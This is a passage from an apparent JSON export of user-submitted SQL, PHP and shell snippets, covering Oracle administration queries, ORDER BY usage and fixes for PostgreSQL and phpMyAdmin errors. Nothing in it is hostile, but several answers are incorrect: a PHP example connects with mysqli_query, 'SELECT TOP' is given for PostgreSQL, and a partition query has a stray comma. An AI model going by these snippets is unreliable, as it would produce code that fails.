    "title": " oracle trigger list",
    "description": "SELECT * FROM ALL_TRIGGERS WHERE TABLE_NAME ='table_name'; SELECT * FROM ALL_OBJECTS WHERE OBJECT_TYPE = 'TRIGGER'; -- Ref columns: SELECT * FROM ALL_TRIGGER_COLS WHERE TABLE_NAME ='table_name'; -- Or DBA_TRIGGERS / USER_TRIGGERS, DBA_TRIGGER_COLS, ...\n",
    "reg_date": "2021-10-12T09:58:41.000Z"
  },
  {
    "id": 3015,
    "keyword": null,
    "link": null,
    "title": " oracle truncate partition",
    "description": "ALTER TABLE table_name TRUNCATE PARTITION partition_name UPDATE INDEXES;\n",
    "reg_date": "2021-10-12T09:58:42.000Z"
  },
  {
    "id": 3016,
    "keyword": null,
    "link": null,
    "title": " oracle turn off constraint",
    "description": "alter table    table_name DISABLE constraint    constraint_name;\n",
    "reg_date": "2021-10-12T09:58:42.000Z"
  },
  {
    "id": 3017,
    "keyword": null,
    "link": null,
    "title": " oracle undo usage",
    "description": "-- UNDO tablespace current usage / available space SELECT a.TABLESPACE_NAME, SIZEMB, USAGEMB, (SIZEMB - USAGEMB) AS FREEMB FROM (SELECT round(sum(BYTES) / 1e6) AS SIZEMB, b.TABLESPACE_NAME       FROM DBA_DATA_FILES a, DBA_TABLESPACES b       WHERE a.TABLESPACE_NAME = b.TABLESPACE_NAME AND b.CONTENTS LIKE 'UNDO'       GROUP BY b.TABLESPACE_NAME) a,      (SELECT c.TABLESPACE_NAME, sum(BYTES) / 1e6 AS USAGEMB       FROM DBA_UNDO_EXTENTS c       WHERE STATUS <> 'EXPIRED'       GROUP BY c.TABLESPACE_NAME) b WHERE a.TABLESPACE_NAME = b.TABLESPACE_NAME;\n-- UNDO tablespace usage per user / session SELECT s.SID, s.USERNAME, round(sum(ss.VALUE) / 1e6, 2) AS UNDO_SIZE_MB,        sql.ELAPSED_TIME, sql.SQL_TEXT FROM V$SESSTAT ss JOIN V$SESSION s ON s.SID = ss.SID      JOIN V$STATNAME STAT ON STAT.STATISTIC# = ss.STATISTIC#      LEFT JOIN V$SQLAREA sql       \tON s.SQL_ADDRESS = sql.ADDRESS AND s.SQL_HASH_VALUE = sql.HASH_VALUE WHERE STAT.NAME = 'undo change vector size' AND s.TYPE <> 'BACKGROUND'    AND s.USERNAME IS NOT NULL AND ss.VALUE >= 0.01 * 1e6 GROUP BY s.SID, s.USERNAME, sql.ELAPSED_TIME, sql.SQL_TEXT ORDER BY s.USERNAME, round(sum(ss.VALUE) / 1e6, 2);\n",
    "reg_date": "2021-10-12T09:58:42.000Z"
  },
  {
    "id": 3018,
    "keyword": null,
    "link": null,
    "title": " oracle undo usage by session",
    "description": "-- UNDO tablespace current usage / available space SELECT a.TABLESPACE_NAME, SIZEMB, USAGEMB, (SIZEMB - USAGEMB) AS FREEMB FROM (SELECT round(sum(BYTES) / 1e6) AS SIZEMB, b.TABLESPACE_NAME       FROM DBA_DATA_FILES a, DBA_TABLESPACES b       WHERE a.TABLESPACE_NAME = b.TABLESPACE_NAME AND b.CONTENTS LIKE 'UNDO'       GROUP BY b.TABLESPACE_NAME) a,      (SELECT c.TABLESPACE_NAME, sum(BYTES) / 1e6 AS USAGEMB       FROM DBA_UNDO_EXTENTS c       WHERE STATUS <> 'EXPIRED'       GROUP BY c.TABLESPACE_NAME) b WHERE a.TABLESPACE_NAME = b.TABLESPACE_NAME;\n-- UNDOTBS usage per User: SELECT u.TABLESPACE_NAME          AS TABLESPACE,        s.USERNAME,        u.STATUS,        sum(u.BYTES) / 1024 / 1024 AS SUM_IN_MB,        count(u.SEGMENT_NAME)      AS SEG_CNTS FROM DBA_UNDO_EXTENTS u, V$TRANSACTION T, V$SESSION s WHERE T.ADDR = s.TADDR GROUP BY u.TABLESPACE_NAME, s.USERNAME, u.STATUS ORDER BY 1, 2, 3;\n-- UNDO tablespace usage per user / session SELECT s.SID, s.USERNAME, round(sum(ss.VALUE) / 1e6, 2) AS UNDO_SIZE_MB,        sql.ELAPSED_TIME, sql.SQL_TEXT FROM V$SESSTAT ss JOIN V$SESSION s ON s.SID = ss.SID      JOIN V$STATNAME STAT ON STAT.STATISTIC# = ss.STATISTIC#      LEFT JOIN V$SQLAREA sql       \tON s.SQL_ADDRESS = sql.ADDRESS AND s.SQL_HASH_VALUE = sql.HASH_VALUE WHERE STAT.NAME = 'undo change vector size' AND s.TYPE <> 'BACKGROUND'    AND s.USERNAME IS NOT NULL AND ss.VALUE >= 0.01 * 1e6 GROUP BY s.SID, s.USERNAME, sql.ELAPSED_TIME, sql.SQL_TEXT ORDER BY s.USERNAME, round(sum(ss.VALUE) / 1e6, 2);\n",
    "reg_date": "2021-10-12T09:58:42.000Z"
  },
  {
    "id": 3019,
    "keyword": null,
    "link": null,
    "title": " oracle undo usage per session",
    "description": "-- UNDOTBS usage per User: SELECT u.TABLESPACE_NAME          AS TABLESPACE,        s.USERNAME,        u.STATUS,        sum(u.BYTES) / 1024 / 1024 AS SUM_IN_MB,        count(u.SEGMENT_NAME)      AS SEG_CNTS FROM DBA_UNDO_EXTENTS u, V$TRANSACTION T, V$SESSION s WHERE T.ADDR = s.TADDR GROUP BY u.TABLESPACE_NAME, s.USERNAME, u.STATUS ORDER BY 1, 2, 3;\n",
    "reg_date": "2021-10-12T09:58:42.000Z"
  },
  {
    "id": 3020,
    "keyword": null,
    "link": null,
    "title": " oracle undotbs usage",
    "description": "-- UNDO tablespace current usage / available space SELECT a.TABLESPACE_NAME, SIZEMB, USAGEMB, (SIZEMB - USAGEMB) AS FREEMB FROM (SELECT round(sum(BYTES) / 1e6) AS SIZEMB, b.TABLESPACE_NAME       FROM DBA_DATA_FILES a, DBA_TABLESPACES b       WHERE a.TABLESPACE_NAME = b.TABLESPACE_NAME AND b.CONTENTS LIKE 'UNDO'       GROUP BY b.TABLESPACE_NAME) a,      (SELECT c.TABLESPACE_NAME, sum(BYTES) / 1e6 AS USAGEMB       FROM DBA_UNDO_EXTENTS c       WHERE STATUS <> 'EXPIRED'       GROUP BY c.TABLESPACE_NAME) b WHERE a.TABLESPACE_NAME = b.TABLESPACE_NAME;\n-- UNDOTBS usage per User: SELECT u.TABLESPACE_NAME          AS TABLESPACE,        s.USERNAME,        u.STATUS,        sum(u.BYTES) / 1024 / 1024 AS SUM_IN_MB,        count(u.SEGMENT_NAME)      AS SEG_CNTS FROM DBA_UNDO_EXTENTS u, V$TRANSACTION T, V$SESSION s WHERE T.ADDR = s.TADDR GROUP BY u.TABLESPACE_NAME, s.USERNAME, u.STATUS ORDER BY 1, 2, 3;\n",
    "reg_date": "2021-10-12T09:58:42.000Z"
  },
  {
    "id": 3021,
    "keyword": null,
    "link": null,
    "title": " oracle unique constraint",
    "description": "ALTER TABLE table_name ADD CONSTRAINT cst_name UNIQUE (col_name);  ALTER TABLE table_name ADD CONSTRAINT cst_name UNIQUE (col1, col2); -- Multiple ALTER TABLE table_name ADD col_name NUMBER UNIQUE;\t\t\t\t  \t-- New field\n",
    "reg_date": "2021-10-12T09:58:42.000Z"
  },
  {
    "id": 3022,
    "keyword": null,
    "link": null,
    "title": " oracle unique constraint multiple columns",
    "description": "ALTER TABLE table_name ADD CONSTRAINT cst_name UNIQUE (col_name);  ALTER TABLE table_name ADD CONSTRAINT cst_name UNIQUE (col1, col2); -- Multiple ALTER TABLE table_name ADD col_name NUMBER UNIQUE;\t\t\t\t  \t-- New field\n",
    "reg_date": "2021-10-12T09:58:42.000Z"
  },
  {
    "id": 3023,
    "keyword": null,
    "link": null,
    "title": " oracle unlock user",
    "description": "-- Unlock a user ALTER USER my_user ACCOUNT UNLOCK; -- If password is expired  ALTER USER my_user IDENTIFIED BY new_password ACCOUNT UNLOCK;\nALTER USER \"MY_SCHEMA_NAME\" ACCOUNT UNLOCK;\n",
    "reg_date": "2021-10-12T09:58:42.000Z"
  },
  {
    "id": 3024,
    "keyword": null,
    "link": null,
    "title": " oracle update with",
    "description": "UPDATE T_NAME SET PARAM_1=23, PARAM_2=true WHERE PARAM_7= 'something'\nUPDATE mytable t\t\t-- Update using WITH statement SET value3 = (     WITH comp AS (         SELECT id, value1         FROM mytable t         WHERE value2 > 10     )     SELECT c.value1     FROM comp c     WHERE c.id = t.id );\n{     UPDATE table-Name [[AS] correlation-Name]         SET column-Name = Value         [ , column-Name = Value} ]*         [WHERE clause] |     UPDATE table-Name         SET column-Name = Value         [ , column-Name = Value ]*         WHERE CURRENT OF }\n",
    "reg_date": "2021-10-12T09:58:43.000Z"
  },
  {
    "id": 3025,
    "keyword": null,
    "link": null,
    "title": " oracle user last connected",
    "description": "SELECT max(TIMESTAMP), A.USERNAME FROM DBA_AUDIT_TRAIL A WHERE ACTION_NAME = 'LOGON' GROUP BY USERNAME ORDER BY 1 DESC;\n",
    "reg_date": "2021-10-12T09:58:43.000Z"
  },
  {
    "id": 3026,
    "keyword": null,
    "link": null,
    "title": " oracle user last connection date",
    "description": "SELECT max(TIMESTAMP), A.USERNAME FROM DBA_AUDIT_TRAIL A WHERE ACTION_NAME = 'LOGON' GROUP BY USERNAME ORDER BY 1 DESC;\n",
    "reg_date": "2021-10-12T09:58:43.000Z"
  },
  {
    "id": 3027,
    "keyword": null,
    "link": null,
    "title": " oracle user privileges",
    "description": "-- List privileges, including roles, for my_user SELECT GRANTEE, PRIVILEGE AS PRIVILEGE_ROLE,        NULL AS OWNER, NULL AS TABLE_NAME, NULL AS COLUMN_NAME,        ADMIN_OPTION AS PRIVILEGE,         NULL AS GRANTABLE FROM DBA_SYS_PRIVS WHERE GRANTEE = 'my_user' UNION ALL SELECT r.GRANTEE, r.GRANTED_ROLE AS PRIVILEGE_ROLE, p.OWNER, p.TABLE_NAME,  \tp.COLUMN_NAME, PRIVILEGE, p.GRANTABLE FROM DBA_ROLE_PRIVS r LEFT JOIN ROLE_TAB_PRIVS p ON p.ROLE = r.GRANTED_ROLE WHERE r.GRANTEE = 'my_user';\n",
    "reg_date": "2021-10-12T09:58:43.000Z"
  },
  {
    "id": 3028,
    "keyword": null,
    "link": null,
    "title": " oracle user quota on tablespace",
    "description": "SELECT * FROM DBA_TS_QUOTAS WHERE USERNAME='MY_USER'; ALTER USER my_user QUOTA 500M ON my_tablespace;\t\t ALTER USER my_user QUOTA UNLIMITED ON my_tablespace;\n",
    "reg_date": "2021-10-12T09:58:43.000Z"
  },
  {
    "id": 3029,
    "keyword": null,
    "link": null,
    "title": " oracle user quota unlimited",
    "description": "SELECT * FROM DBA_TS_QUOTAS WHERE USERNAME='MY_USER'; ALTER USER my_user QUOTA 500M ON my_tablespace;\t\t ALTER USER my_user QUOTA UNLIMITED ON my_tablespace;\n",
    "reg_date": "2021-10-12T09:58:43.000Z"
  },
  {
    "id": 3030,
    "keyword": null,
    "link": null,
    "title": " oracle user tables",
    "description": "SELECT * FROM USER_TABLES;\t\t-- Tables from connected schema SELECT * FROM ALL_TABLES;\t\t-- Tables available to connected schema \tSELECT * FROM ALL_TABLES WHERE OWNER = 'SCHEMA_NAME'; \tSELECT * FROM ALL_TABLES WHERE TABLES_NAME = 'TABLE_NAME'; SELECT * FROM DBA_TABLES;\t\t-- All Tables\n",
    "reg_date": "2021-10-12T09:58:43.000Z"
  },
  {
    "id": 3031,
    "keyword": null,
    "link": null,
    "title": " oracle v$TRANSACTION",
    "description": "-- Active transactions (generating UNDO) SELECT s.SID, s.SERIAL#, s.CLIENT_INFO, t.ADDR, sum(t.USED_UBLK) FROM V$TRANSACTION t,      V$SESSION s WHERE t.ADDR = s.TADDR GROUP BY s.SID, s.SERIAL#, s.CLIENT_INFO, t.ADDR;\n",
    "reg_date": "2021-10-12T09:58:43.000Z"
  },
  {
    "id": 3032,
    "keyword": null,
    "link": null,
    "title": " oracle v$parameter",
    "description": "GRANT SELECT_CATALOG_ROLE TO my_user;\t-- to read V$PARAMETER   SELECT NAME, VALUE, DESCRIPTION FROM V$PARAMETER  --WHERE upper(NAME) = 'NLS_DATE_FORMAT'  ORDER BY NAME;  ALTER SESSION SET  \tNLS_LANGUAGE='AMERICAN'      NLS_TERRITORY='AMERICA'      NLS_CALENDAR='GREGORIAN'     NLS_DATE_FORMAT='DD/MM/YYYY HH24:MI:SS';\n",
    "reg_date": "2021-10-12T09:58:43.000Z"
  },
  {
    "id": 3033,
    "keyword": null,
    "link": null,
    "title": " oracle v$parameter does not exist",
    "description": "GRANT SELECT_CATALOG_ROLE TO my_user;\t-- to read V$PARAMETER   SELECT NAME, VALUE, DESCRIPTION FROM V$PARAMETER  --WHERE upper(NAME) = 'NLS_DATE_FORMAT'  ORDER BY NAME;  ALTER SESSION SET  \tNLS_LANGUAGE='AMERICAN'      NLS_TERRITORY='AMERICA'      NLS_CALENDAR='GREGORIAN'     NLS_DATE_FORMAT='DD/MM/YYYY HH24:MI:SS';\n",
    "reg_date": "2021-10-12T09:58:43.000Z"
  },
  {
    "id": 3034,
    "keyword": null,
    "link": null,
    "title": " oracle v$session",
    "description": "-- Active transactions (generating UNDO) SELECT s.SID, s.SERIAL#, s.CLIENT_INFO, t.ADDR, sum(t.USED_UBLK) FROM V$TRANSACTION t,      V$SESSION s WHERE t.ADDR = s.TADDR GROUP BY s.SID, s.SERIAL#, s.CLIENT_INFO, t.ADDR;\n",
    "reg_date": "2021-10-12T09:58:44.000Z"
  },
  {
    "id": 3035,
    "keyword": null,
    "link": null,
    "title": " oracle view",
    "description": "SELECT * FROM USER_VIEWS;\t\t-- Views from connected schema SELECT * FROM ALL_VIEWS;\t\t-- Views available to connected schema \tSELECT * FROM ALL_VIEWS WHERE OWNER = 'SCHEMA_NAME'; \tSELECT * FROM ALL_VIEWS WHERE VIEW_NAME = 'VIEW_NAME'; SELECT * FROM DBA_VIEWS;\t\t-- All database Views\n",
    "reg_date": "2021-10-12T09:58:44.000Z"
  },
  {
    "id": 3036,
    "keyword": null,
    "link": null,
    "title": " oracle view ddl",
    "description": "-- Views (use USER_VIEWS or DBA_VIEWS if needed): SELECT TEXT FROM ALL_VIEWS WHERE upper(VIEW_NAME) LIKE upper('%VIEW_NAME%'); -- Or: SELECT dbms_metadata.get_ddl('VIEW', 'VIEW_NAME', 'OWNER_NAME') FROM DUAL;  -- Materialized views (use USER_VIEWS or DBA_VIEWS if needed): SELECT QUERY FROM ALL_MVIEWS WHERE upper(MVIEW_NAME) LIKE upper('%VIEW_NAME%'); -- Or: SELECT dbms_metadata.get_ddl('MATERIALIZED_VIEW', 'VIEW_NAME', 'OWNER_NAME')  FROM DUAL;\n",
    "reg_date": "2021-10-12T09:58:44.000Z"
  },
  {
    "id": 3037,
    "keyword": null,
    "link": null,
    "title": " oracle view dependencies",
    "description": "-- Dependencies on a view, table, ... SELECT *   FROM ALL_DEPENDENCIES\t\t\t-- or DBA_DEPENDENCIES or USER_DEPENDENCIES  WHERE TYPE = 'VIEW'\t\t\t-- or 'PROCEDURE', 'SYNONYM'...    AND REFERENCED_OWNER = 'OBJECT_OWNER'    AND REFERENCED_NAME = 'OBJECT_NAME';\n",
    "reg_date": "2021-10-12T09:58:44.000Z"
  },
  {
    "id": 3038,
    "keyword": null,
    "link": null,
    "title": " oracle view source",
    "description": "-- Views (use USER_VIEWS or DBA_VIEWS if needed): SELECT TEXT FROM ALL_VIEWS WHERE upper(VIEW_NAME) LIKE upper('%VIEW_NAME%'); -- Or: SELECT dbms_metadata.get_ddl('VIEW', 'VIEW_NAME', 'OWNER_NAME') FROM DUAL;  -- Materialized views (use USER_VIEWS or DBA_VIEWS if needed): SELECT QUERY FROM ALL_MVIEWS WHERE upper(MVIEW_NAME) LIKE upper('%VIEW_NAME%'); -- Or: SELECT dbms_metadata.get_ddl('MATERIALIZED_VIEW', 'VIEW_NAME', 'OWNER_NAME')  FROM DUAL;\n",
    "reg_date": "2021-10-12T09:58:44.000Z"
  },
  {
    "id": 3039,
    "keyword": null,
    "link": null,
    "title": " oracle virtual column",
    "description": "CREATE TABLE T1 (     ID          NUMBER,     PRODUCT     VARCHAR2(50),     PRICE       NUMBER(10, 2),     TAXED_PRICE NUMBER(10, 2) GENERATED ALWAYS AS (round(PRICE * 1.2, 2)) VIRTUAL ); INSERT INTO T1 (ID, PRODUCT, PRICE) VALUES (1, 'Spoon', 12);\n",
    "reg_date": "2021-10-12T09:58:44.000Z"
  },
  {
    "id": 3040,
    "keyword": null,
    "link": null,
    "title": " oracle wait",
    "description": "BEGIN \tDBMS_SESSION.SLEEP(5);\t\t\t-- waits 5s END;\n",
    "reg_date": "2021-10-12T09:58:44.000Z"
  },
  {
    "id": 3041,
    "keyword": null,
    "link": null,
    "title": " oracle wildcard",
    "description": "SELECT * FROM table_name WHERE UPPER(col_name) LIKE '%SEARCHED%'; SELECT * FROM table_name WHERE col_name LIKE '%Searched%';  -- Case sensitive  SYMBOL\tDESCRIPTION\t(SQL)                       EXAMPLE %\t    zero or more characters\t                bl%      'bl, black, blue, blob' _\t    a single character\t                    h_t      'hot, hat, hit' []\t    any single character within brackets\th[oa]t   'hot, hat', but NOT 'hit' ^\t    any character not in the brackets\t    h[^oa]t  'hit', but NOT 'hot, hat' -\t    a range of characters\t                [a-b]t   'cat, cbt'\n",
    "reg_date": "2021-10-12T09:58:44.000Z"
  },
  {
    "id": 3042,
    "keyword": null,
    "link": null,
    "title": " oracles pipes",
    "description": "SELECT ownerid, name, type, pipe_size FROM   v$db_pipes ORDER BY 1,2;\n",
    "reg_date": "2021-10-12T09:58:44.000Z"
  },
  {
    "id": 3043,
    "keyword": null,
    "link": null,
    "title": " orcale sql change column type",
    "description": "ALTER TABLE table_name  MODIFY column_name action;\n",
    "reg_date": "2021-10-12T09:58:44.000Z"
  },
  {
    "id": 3044,
    "keyword": null,
    "link": null,
    "title": " order by count postgres",
    "description": "select      count(w.id) as mycount,     w.company_id,     c.company_name,     c.city from      companies c      left join workers w on          c.id=w.company_id  group by      w.company_id,     c.company_name,     c.city order by mycount desc;\n",
    "reg_date": "2021-10-12T09:58:45.000Z"
  },
  {
    "id": 3045,
    "keyword": null,
    "link": null,
    "title": " order by desc",
    "description": "//SQL  SELECT * FROM Customers  ORDER BY Country DESC; \n",
    "reg_date": "2021-10-12T09:58:45.000Z"
  },
  {
    "id": 3046,
    "keyword": null,
    "link": null,
    "title": " order by desc postgres",
    "description": "SELECT TOP 1 \t* FROM \tusers ORDER BY \tid desc;\n                                     SELECT \tselect_list FROM \ttable_name ORDER BY \tsort_expression1 [ASC | DESC],         ... \tsort_expressionN [ASC | DESC];Code language: SQL (Structured Query Language) (sql)\nSELECT \tselect_list FROM \ttable_name ORDER BY \tsort_expression1 [ASC | DESC],         ... \tsort_expressionN [ASC | DESC];\n",
    "reg_date": "2021-10-12T09:58:45.000Z"
  },
  {
    "id": 3047,
    "keyword": null,
    "link": null,
    "title": " order by in codeigniter query builder",
    "description": "$this->db->order_by('title', 'DESC'); // Produces: ORDER BY `title` DESC \n$this->db->order_by('RegisteredUserID','ASC') // Produces: ORDER BY `RegisteredUserID` ASC  $this->db->order_by('RegisteredUserID','DESC') // Produces: ORDER BY `RegisteredUserID` DESC\n",
    "reg_date": "2021-10-12T09:58:45.000Z"
  },
  {
    "id": 3048,
    "keyword": null,
    "link": null,
    "title": " order by ip address sql",
    "description": "SELECT ip_address FROM ip ORDER BY INET_ATON(ip_address)\n",
    "reg_date": "2021-10-12T09:58:45.000Z"
  },
  {
    "id": 3049,
    "keyword": null,
    "link": null,
    "title": " order by multiple columns",
    "description": "ORDER BY column1 DESC, column2 \n",
    "reg_date": "2021-10-12T09:58:45.000Z"
  },
  {
    "id": 3050,
    "keyword": null,
    "link": null,
    "title": " order by oracle",
    "description": "SELECT expressions FROM tables [WHERE conditions] ORDER BY expression [ ASC | DESC ];\n",
    "reg_date": "2021-10-12T09:58:45.000Z"
  },
  {
    "id": 3051,
    "keyword": null,
    "link": null,
    "title": " order by postgresql",
    "description": "SELECT TOP 1 \t* FROM \tusers ORDER BY \tid desc;\n                                     SELECT \tselect_list FROM \ttable_name ORDER BY \tsort_expression1 [ASC | DESC],         ... \tsort_expressionN [ASC | DESC];Code language: SQL (Structured Query Language) (sql)\n",
    "reg_date": "2021-10-12T09:58:45.000Z"
  },
  {
    "id": 3052,
    "keyword": null,
    "link": null,
    "title": " order by sql",
    "description": "SELECT * FROM table_name ORDER BY col1 ASC;\t\t\t\t-- ASCending is default SELECT * FROM table_name ORDER BY col1 DESC;\t\t\t-- DESCending SELECT * FROM table_name ORDER BY col1 DESC, col2;\t \t-- col1 DESC then col2 ASC\n//this_for_descending_order..   SELECT * FROM TableName ORDER BY columnName DESC;  // this_for_ascending_order.. SELECT * FROM TableName ORDER BY columnName ASC;\nSELECT q.*      FROM (SELECT TOP 3 *                FROM table                ORDER BY id DESC) q     ORDER BY q.id ASC\nSELECT * FROM employees ORDER BY employees.employee_id DESC ; &middot;        Ascending ( ASC) &middot;        Descending ( DESC)\nSQL order of execution defines the execution order of clauses.  -Select It starts execution with  -from  (Choose and join tables to get base data) after from -where ( filters base data ) -group by (Aggregates base data) -having (filters aggregated data) -select (returns final data) -order by (sorts the final data) -limit (limits the returned data to a row count)  Only select and from are mandatory\nSELECT DISTINCT column, AGG_FUNC(column_or_expression), &hellip; FROM mytable     JOIN another_table       ON mytable.column = another_table.column     WHERE constraint_expression     GROUP BY column     HAVING constraint_expression     ORDER BY column ASC/DESC     LIMIT count OFFSET COUNT;\n",
    "reg_date": "2021-10-12T09:58:45.000Z"
  },
  {
    "id": 3053,
    "keyword": null,
    "link": null,
    "title": " order by with more than one column",
    "description": "The following shows that you can perform order by with more than one column. 'ASC' denotes ascending sort order, but is optional as it is the default sort order. 'DESC' denotes descending sort order  SELECT Id, CompanyName, City, Country   FROM Supplier  WHERE Country IN ('USA', 'Japan', 'Germany')  ORDER BY Country ASC, CompanyName DESC\n",
    "reg_date": "2021-10-12T09:58:45.000Z"
  },
  {
    "id": 3054,
    "keyword": null,
    "link": null,
    "title": " order by with where clause in mysql",
    "description": "SELECT expressions   FROM tables   [WHERE conditions]   ORDER BY expression [ ASC | DESC ];  \n",
    "reg_date": "2021-10-12T09:58:46.000Z"
  },
  {
    "id": 3055,
    "keyword": null,
    "link": null,
    "title": " order of execution in sql",
    "description": "1. FROM 2. WHERE 3. GROUP BY 4. HAVING 5. SELECT 6. ORDER BY \nSQL order of execution defines the execution order of clauses.  -Select It starts execution with  -from  (Choose and join tables to get base data) after from -where ( filters base data ) -group by (Aggregates base data) -having (filters aggregated data) -select (returns final data) -order by (sorts the final data) -limit (limits the returned data to a row count)  Only select and from are mandatory\nSELECT DISTINCT column, AGG_FUNC(column_or_expression), &hellip; FROM mytable     JOIN another_table       ON mytable.column = another_table.column     WHERE constraint_expression     GROUP BY column     HAVING constraint_expression     ORDER BY column ASC/DESC     LIMIT count OFFSET COUNT;\n1. FROM (including joins) 2. WHERE 3. GROUP BY 4. HAVING 5. SELECT 6. ORDER BY \n",
    "reg_date": "2021-10-12T09:58:46.000Z"
  },
  {
    "id": 3056,
    "keyword": null,
    "link": null,
    "title": " order of sql",
    "description": "SQL order of execution defines the execution order of clauses.  -Select It starts execution with  -from  (Choose and join tables to get base data) after from -where ( filters base data ) -group by (Aggregates base data) -having (filters aggregated data) -select (returns final data) -order by (sorts the final data) -limit (limits the returned data to a row count)  Only select and from are mandatory\nORDER BY: is for sorting result either in descending or ascending order.\n",
    "reg_date": "2021-10-12T09:58:46.000Z"
  },
  {
    "id": 3057,
    "keyword": null,
    "link": null,
    "title": " org.h2.jdbc.jdbcsqlsyntaxerrorexception",
    "description": "DB_CLOSE_DELAY=-1  # To keep the database open, add ;DB_CLOSE_DELAY=-1 to the database URL: jdbc:h2:mem:test;DB_CLOSE_DELAY=-1\n",
    "reg_date": "2021-10-12T09:58:46.000Z"
  },
  {
    "id": 3058,
    "keyword": null,
    "link": null,
    "title": " org.h2.jdbc.jdbcsqlsyntaxerrorexception table not found",
    "description": "DB_CLOSE_DELAY=-1  # To keep the database open, add ;DB_CLOSE_DELAY=-1 to the database URL: jdbc:h2:mem:test;DB_CLOSE_DELAY=-1\n",
    "reg_date": "2021-10-12T09:58:46.000Z"
  },
  {
    "id": 3059,
    "keyword": null,
    "link": null,
    "title": " osm2pgsql mac",
    "description": "brew install osm2pgsql \n",
    "reg_date": "2021-10-12T09:58:46.000Z"
  },
  {
    "id": 3060,
    "keyword": null,
    "link": null,
    "title": " ostgreSQL version",
    "description": "# SSH psql --version # SQL SELECT version();\n",
    "reg_date": "2021-10-12T09:58:46.000Z"
  },
  {
    "id": 3061,
    "keyword": null,
    "link": null,
    "title": " output data in sql",
    "description": "<?php \t/* Connect to your database */ \t$con = mysqli_query(\"hostname\", \"username\", \"pwd\", \"database\");     /* Select Columns from table*/     $sql = \"SELECT * FROM `TABLE`\";     /* Query your SQL code to SQLDatabase */     $result = mysqli_query($con, $sql);     /* Find rows in table*/     $check = mysqli_num_rows($result);     if($check > 0){     while($data= mysqli_fetch_assoc($result)){     /* Print all of your data*/     echo $data[\"ColName\"];     }     } ?>\n",
    "reg_date": "2021-10-12T09:58:46.000Z"
  },
  {
    "id": 3062,
    "keyword": null,
    "link": null,
    "title": " pandas sql commands",
    "description": "SQL_Query = pd.read_sql_query( '''select product_name, product_price_per_unit, units_ordered, ((units_ordered) * (product_price_per_unit)) AS revenue from tracking_sales''', conn) \n",
    "reg_date": "2021-10-12T09:58:46.000Z"
  },
  {
    "id": 3063,
    "keyword": null,
    "link": null,
    "title": " pandas to sql index",
    "description": "resultDf.to_sql('table_name', engine, schema=\"schema_name\", if_exists=\"append\", index=False)\n",
    "reg_date": "2021-10-12T09:58:46.000Z"
  },
  {
    "id": 3064,
    "keyword": null,
    "link": null,
    "title": " partition by in mysql",
    "description": "select challenge_id, h_id, h_name, score,     dense_rank() over ( partition by challenge_id order by score desc )         as \"rank\", from hacker; \n",
    "reg_date": "2021-10-12T09:58:46.000Z"
  },
  {
    "id": 3065,
    "keyword": null,
    "link": null,
    "title": " pdo mysql insert",
    "description": "<?php $pdo = new PDO('mysql:host=localhost;dbname=test', 'username', 'password');   $statement = $pdo->prepare(\"INSERT INTO users (email, vorname, nachname) VALUES (?, ?, ?)\"); $statement->execute(array('info@php-einfach.de', 'Klaus', 'Neumann'));    ?> \n",
    "reg_date": "2021-10-12T09:58:47.000Z"
  },
  {
    "id": 3066,
    "keyword": null,
    "link": null,
    "title": " pentaho + pasar de excel a sql",
    "description": "Pentaho\n",
    "reg_date": "2021-10-12T09:58:47.000Z"
  },
  {
    "id": 3067,
    "keyword": null,
    "link": null,
    "title": " permission denied postgres \\copy csv command line",
    "description": "Give a permission to postgres user with chown command   like :  sudo chown postgres:postgres /home/username/Desktop/postgresData\n",
    "reg_date": "2021-10-12T09:58:47.000Z"
  },
  {
    "id": 3068,
    "keyword": null,
    "link": null,
    "title": " pg restore: error: input file appears to be a text format dump. Please use psql.",
    "description": "psql -Umyuser db_development < postgres_db.du\npg_restore --verbose --clean --no-acl --no-owner --host localhost --dbname my-destination-database /tmp/db.dump \n",
    "reg_date": "2021-10-12T09:58:47.000Z"
  },
  {
    "id": 3069,
    "keyword": null,
    "link": null,
    "title": " pgadmin postgres ERROR: database is being accessed by other users",
    "description": "PostgresVersion >=9.2  SELECT     pg_terminate_backend(pg_stat_activity.pid) FROM pg_stat_activity WHERE    pg_stat_activity.datname = 'name_of_database_to_be_disconnected' AND pid <> pg_backend_pid()\n",
    "reg_date": "2021-10-12T09:58:47.000Z"
  },
  {
    "id": 3070,
    "keyword": null,
    "link": null,
    "title": " pgsql is not permitted to log in",
    "description": "ALTER ROLE \"asunotest\" WITH LOGIN; \n",
    "reg_date": "2021-10-12T09:58:47.000Z"
  },
  {
    "id": 3071,
    "keyword": null,
    "link": null,
    "title": " phone number sql",
    "description": "phone varchar(15) NOT NULL UNIQUE,  -- Here is a good column for phone number with datatype varchar(15)\n",
    "reg_date": "2021-10-12T09:58:47.000Z"
  },
  {
    "id": 3072,
    "keyword": null,
    "link": null,
    "title": " phpMyAdmin tried to connect to the MySQL server, and the server rejected the connection.",
    "description": "/* Answer to: \"phpMyAdmin tried to connect to the MySQL server, and the server rejected the connection. You should check the host, username and password in your configuration and make sure that they correspond to the information given by the administrator of the MySQL server.\" */  /*   Go to c:\\wamp\\apps\\phpmyadmin3.3.9. Then open/edit the file named:   config.inc.php    And in the following line, enter the password that you have setup   previously:   $cfg['Servers'][$i]['password'] = '';   > If your password is \"123\":   > $cfg['Servers'][$i]['password'] = '123';    This should work, if not change this:   from: $cfg['Servers'][$i]['AllowNoPassword'] = true;   to: $cfg['Servers'][$i]['AllowNoPassword'] = false; */\n",
    "reg_date": "2021-10-12T09:58:47.000Z"
  },
  {
    "id": 3073,
    "keyword": null,
    "link": null,
    "title": " phpMyAdmin tried to connect to the MySQL server.",
    "description": "/* Answer to: \"phpMyAdmin tried to connect to the MySQL server, and the server rejected the connection. You should check the host, username and password in your configuration and make sure that they correspond to the information given by the administrator of the MySQL server.\" */  /*   Go to c:\\wamp\\apps\\phpmyadmin3.3.9. Then open/edit the file named:   config.inc.php    And in the following line, enter the password that you have setup   previously:   $cfg['Servers'][$i]['password'] = '';   > If your password is \"123\":   > $cfg['Servers'][$i]['password'] = '123';    This should work, if not change this:   from: $cfg['Servers'][$i]['AllowNoPassword'] = true;   to: $cfg['Servers'][$i]['AllowNoPassword'] = false; */\n",
    "reg_date": "2021-10-12T09:58:47.000Z"
  },
  {
    "id": 3074,
    "keyword": null,
    "link": null,
    "title": " php hash password",
